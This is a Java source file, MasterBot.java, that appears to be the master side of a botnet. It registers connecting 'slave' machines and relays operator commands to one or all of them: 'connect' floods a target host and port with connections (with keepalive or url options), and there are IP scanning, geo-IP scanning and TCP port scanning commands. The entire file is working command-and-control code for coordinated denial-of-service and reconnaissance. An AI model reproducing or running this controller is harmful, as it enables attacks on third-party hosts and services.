//Author:Vagdevi Challa
//File:MasterBot.java

import java.io.*;
import java.net.*;
import java.sql.Date;
import java.util.ArrayList;
import java.util.Iterator;

public class MasterBot
{
	 ArrayList<SlaveInfo> slaveArrayList;
	 int portNumber;
	 ServerSocket serverSocket;
	public MasterBot(int portNumber ) throws IOException{
			  this.serverSocket = new ServerSocket(portNumber);		    
		      this.slaveArrayList = new ArrayList<SlaveInfo>();
		      this.portNumber = portNumber;
		      Thread thread = new Thread(new RequestHandler());
		      thread.start();
	}
	public static void main(String[] args) throws IOException {
		if (args.length != 2 || args[0].equals("p") || !(args[0].equals("-p"))) {
		      System.err.println("Usage: java MasterBot -p <port number>");
		      System.exit(1);
		    }
		int portNumber = Integer.parseInt(args[1]);
		MasterBot masterBotObject = new MasterBot(portNumber);
		//Infinite loop
		while(true){
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
			String userInput = null;
			try
			{
				System.out.print(">");
				userInput = bufferedReader.readLine();
				if(userInput.equals("exit")){
					System.exit(1);
				}
				else if(userInput != null &&  !(userInput.isEmpty()) )
				{
					masterBotObject.getDetails(userInput);
				}
				
			} catch (IOException ex)
				{
					ex.printStackTrace();
				}
		}
	
	}
	public class RequestHandler implements Runnable {
		
		private Socket clientSocket;;
		
		public void run(){
		while(true){
			try {
				clientSocket = serverSocket.accept();
				//InetAddress inetAddress = client.getInetAddress();
				InetAddress inetAddress= clientSocket.getInetAddress();
				String HostName = inetAddress.getHostName();
				String IPAddress =inetAddress.getHostAddress();
				//int SourcePortNumber = portNumber;
				int SourcePortNumber = clientSocket.getPort();
				Date RegistrationDate = new Date(System.currentTimeMillis());
				SlaveInfo slaveInfo = new SlaveInfo(HostName, IPAddress, SourcePortNumber, clientSocket, RegistrationDate);
				slaveArrayList.add(slaveInfo);

			} catch (IOException e) {

				e.printStackTrace();
				try {
					serverSocket.close();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			} 
			}
		}
	}
    public void getDetails(String ui) throws IOException  {
		
		String[] userInputSplit = ui.split(" ");
		if(userInputSplit.length <= 0)	return;
		switch(userInputSplit[0])
		{
			case "list":
				if(!(slaveArrayList.isEmpty())){
				System.out.println("SlaveHostName IPAddress SourcePortNumber RegistrationDate");
				for(SlaveInfo slaveData: slaveArrayList)
				{
					System.out.print(slaveData.getHostname() + " ");
					System.out.print(slaveData.getIpaddress() + " ");
					System.out.print(slaveData.getPort() + " ");
					System.out.print(slaveData.getRegistrationDate() + " ");
					System.out.println();
				}
				} else {
					System.out.println("No slaves connected");
				}break;

			case "connect":
				if(!(slaveArrayList.isEmpty())){
				if(userInputSplit.length == 5) {
					if(!(userInputSplit[4].equals("keepalive")) && !(userInputSplit[4].startsWith("url="))){
						if(userInputSplit[1].equals("all")){
							for(SlaveInfo slaveData: slaveArrayList){
								PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
							for(SlaveInfo slaveData: slaveArrayList){
								if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
						PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
						printWriter.println(ui);
								}
							}
						}
					}
					else if(userInputSplit[4].substring(0, 4).equals("url=")){
						//System.out.println("Into length 5 url");
						if(userInputSplit[1].equals("all")){
							for(SlaveInfo slaveData: slaveArrayList){
								PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
						for(SlaveInfo slaveData: slaveArrayList){
						if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
						PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
						printWriter.println(ui);
						}
						}
					}
					}
					else if(userInputSplit[4].equals("keepalive")){
						//System.out.println("Into length 5 keep");
						if(userInputSplit[1].equals("all")){
							for(SlaveInfo slaveData: slaveArrayList){
								PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
						for(SlaveInfo slaveData: slaveArrayList){
						if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
						PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
						printWriter.println(ui);
						}
						}
					}
					}
					
				}
				else if(userInputSplit.length == 4) {
					//System.out.println("Into length 4");
					if(userInputSplit[1].equals("all")){
						for(SlaveInfo slaveData: slaveArrayList){
							PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
							printWriter.println(ui);
						}
					} else {
					for(SlaveInfo slaveData: slaveArrayList){
						if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
						PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
						printWriter.println(ui);
						}
					}
				    }
				}
				else if(userInputSplit.length == 6 && userInputSplit[5].equals("keepalive")) {
					//System.out.println("Into length 6 keep");
					if(userInputSplit[1].equals("all")){
						for(SlaveInfo slaveData: slaveArrayList){
							PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
							printWriter.println(ui);
						}
					} else {
					for(SlaveInfo slaveData: slaveArrayList){
					if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
					PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
					printWriter.println(ui);
					}
					}
				}
				}
				else if(userInputSplit.length == 6 && userInputSplit[5].substring(0, 4).equals("url=")) {
					//System.out.println("Into length 6 url");
					if(userInputSplit[1].equals("all")){
						for(SlaveInfo slaveData: slaveArrayList){
							PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
							printWriter.println(ui);
						}
					} else {
					for(SlaveInfo slaveData: slaveArrayList){
					if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
					PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
					printWriter.println(ui);
					}
					}
				}
				}
				else if(userInputSplit.length < 4 || userInputSplit.length > 6){
					System.out.println("Invalid Arguments.Usage: connect (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) TargetPortNumber [NumberOfConnections: 1 if not specified]");
				}
				}else{
					System.out.println("No Slaves are connected to master");
				}break;
			
			case "ipscan":
				if(!(slaveArrayList.isEmpty())){
					if(userInputSplit.length == 3){
						Iterator<SlaveInfo> it = slaveArrayList.iterator();
						SlaveInfo slaveipcon = null;
						if(userInputSplit[1].equals("all")){
							while(it.hasNext()){
								slaveipcon = it.next();
								PrintWriter printWriter = new PrintWriter(slaveipcon.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
							int flag=0;
							while(it.hasNext()){
								slaveipcon = it.next();
								if(slaveipcon.getIpaddress().equals(userInputSplit[1]) || slaveipcon.getHostname().equals(userInputSplit[1])){
									flag = 1;
									PrintWriter printWriter = new PrintWriter(slaveipcon.getSocket().getOutputStream(), true);
									printWriter.println(ui);
								}
							}
							if(flag ==0){
								System.out.println("Slave address did not match");
							}
						}
						final SlaveInfo slaveipconnection = slaveipcon;
						Thread thread = new Thread(){
							public void run()
							{
								BufferedReader bufferedReader;
								try 
								{
									bufferedReader = new BufferedReader(new InputStreamReader(slaveipconnection.getSocket().getInputStream()));
									String l = bufferedReader.readLine();
									System.out.println("IPScan List: " + l);
								} 
								catch (IOException e) 
								{								
									e.printStackTrace();
								}
							}
						};
						thread.start();
					}					
				}else{
					System.out.println("No Slaves are connected to master");
				}break;
			case "geoipscan":
				if(!(slaveArrayList.isEmpty())){
					if(userInputSplit.length == 3){
						Iterator<SlaveInfo> it = slaveArrayList.iterator();
						SlaveInfo slaveipcon = null;
						if(userInputSplit[1].equals("all")){
							while(it.hasNext()){
								slaveipcon = it.next();
								PrintWriter printWriter = new PrintWriter(slaveipcon.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
							int flag=0;
							while(it.hasNext()){
								slaveipcon = it.next();
								if(slaveipcon.getIpaddress().equals(userInputSplit[1]) || slaveipcon.getHostname().equals(userInputSplit[1])){
									flag = 1;
									PrintWriter printWriter = new PrintWriter(slaveipcon.getSocket().getOutputStream(), true);
									printWriter.println(ui);
								}
							}
							if(flag ==0){
								System.out.println("Slave address did not match");
							}
						}
						final SlaveInfo slaveipconnection = slaveipcon;
						Thread thread = new Thread(){
							public void run()
							{
								BufferedReader bufferedReader;
								try 
								{
									bufferedReader = new BufferedReader(new InputStreamReader(slaveipconnection.getSocket().getInputStream()));
									String line;
									while ((line = bufferedReader.readLine())!= null) {
										System.out.println(line);
					        			}
								} 
								catch (IOException e) 
								{								
									e.printStackTrace();
								}
							}
						};
						thread.start();
					}					
				}else{
					System.out.println("No Slaves are connected to master");
				}break;
			case "tcpportscan":
				if(!(slaveArrayList.isEmpty())){
					if(userInputSplit.length == 4){
						Iterator<SlaveInfo> it = slaveArrayList.iterator();
						SlaveInfo slavetcpcon = null;
						if(userInputSplit[1].equals("all")){
							while(it.hasNext()){
								slavetcpcon = it.next();
								PrintWriter printWriter = new PrintWriter(slavetcpcon.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
							int flag=0;
							while(it.hasNext()){
								slavetcpcon = it.next();
								if(slavetcpcon.getIpaddress().equals(userInputSplit[1]) || slavetcpcon.getHostname().equals(userInputSplit[1])){
									flag = 1;
									PrintWriter printWriter = new PrintWriter(slavetcpcon.getSocket().getOutputStream(), true);
									printWriter.println(ui);
								}
							}
							if(flag ==0){
								System.out.println("Slave address did not match");
							}
						}
						final SlaveInfo slavetcpconnection = slavetcpcon;
						Thread thread = new Thread(){
							public void run()
							{
								BufferedReader bufferedReader;
								try 
								{
									bufferedReader = new BufferedReader(new InputStreamReader(slavetcpconnection.getSocket().getInputStream()));
									
									String l = bufferedReader.readLine();
									
									System.out.println("TCPportscan List: " + l);
								} 
								catch (IOException e) 
								{								
									e.printStackTrace();
								}
							}
						};
						thread.start();
					}					
				}else{
					System.out.println("No Slaves are connected to master");
				}break;
			case "disconnect":
				if(!(slaveArrayList.isEmpty())){
				if(userInputSplit.length == 4) {
					if(userInputSplit[1].equals("all")){
						for(SlaveInfo slaveData: slaveArrayList){
							PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
							printWriter.println(ui);
						}
					} else {
					for(SlaveInfo slaveData: slaveArrayList){
						if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
						PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
						printWriter.println(ui);
						}
					}
					}
					}
				else if(userInputSplit.length == 3) {
						userInputSplit[2]="all";
						if(userInputSplit[1].equals("all")){
							for(SlaveInfo slaveData: slaveArrayList){
								PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
								printWriter.println(ui);
							}
						} else {
						for(SlaveInfo slaveData: slaveArrayList){
							if(slaveData.getHostname().equals(userInputSplit[1]) || slaveData.getIpaddress().equals(userInputSplit[1])){
							PrintWriter printWriter = new PrintWriter(slaveData.getSocket().getOutputStream(), true);
							printWriter.println(ui);
							}
					    }
						}
					}
				else if(userInputSplit.length < 3 || userInputSplit.length > 4){
					System.out.println("Invalid Arguments.Usage: disconnect (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) [TargetPort:all if no port specified]");
				}
				} else {
					System.out.println("No Slaves are connected to master");
				}break;
			default:
				System.exit(1);
				break;
		}
	}
	public class SlaveInfo {
		private String HostName;
		private String IPAddress;
		private int SourcePortNumber;
		private Socket socket;
		private Date RegistrationDate;

		public SlaveInfo(String HostName, String IPAddress, int SourcePortNumber, Socket socket, Date RegistrationDate)
				{
				this.HostName = HostName;
				this.IPAddress = IPAddress;
				this.SourcePortNumber = SourcePortNumber;
				this.socket = socket;
				this.RegistrationDate = RegistrationDate;
				}

		public void setHostname(String HostName)
		{
			this.HostName = HostName;
		}
		public void setIpaddress(String IPAddress)
		{
			this.IPAddress = IPAddress;
		}
		public void setPort(int SourcePortNumber)
		{
			this.SourcePortNumber = SourcePortNumber;
		}
		public void setSocket(Socket socket)
		{
			this.socket = socket;
		}
		public void setRegistrationDate(Date RegistrationDate)
		{
			this.RegistrationDate = RegistrationDate;
		}


		public String getHostname()
		{
			return HostName;
		}
		public String getIpaddress()
		{
			return IPAddress;
		}
		public int getPort()
		{
			return SourcePortNumber;
		}
		public Socket getSocket()
		{
			return socket;
		}
		public Date getRegistrationDate()
		{
			return RegistrationDate;
		}
		
	}
	
}